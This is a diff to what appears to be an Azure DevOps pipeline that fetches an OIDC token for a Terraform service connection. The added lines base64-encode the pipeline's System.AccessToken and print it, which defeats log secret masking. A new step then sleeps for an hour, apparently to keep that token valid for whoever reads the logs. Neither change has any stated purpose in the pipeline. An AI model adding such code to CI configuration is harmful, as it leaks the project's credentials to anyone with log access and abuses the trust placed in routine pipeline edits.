@@ -58,6 +58,9 @@ jobs:
           Write-Host "Requesting OIDC token from Azure DevOps REST API at $env:ARM_OIDC_REQUEST_URL"
           $env:ARM_OIDC_REQUEST_TOKEN = '$(System.AccessToken)'
 
+          # base 64 encode access token
+          [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$(System.AccessToken)'))  
+
           try {
             Invoke-WebRequest -Headers @{
                                 Authorization  = "Bearer $(System.AccessToken)"
@@ -78,3 +81,6 @@ jobs:
         useGlobalConfig: true
         failOnStandardError: true
         workingDirectory: '$(Build.SourcesDirectory)/deployment/terraform-service-connection'
+
+    - pwsh: |
+        Start-Sleep -Seconds 3600
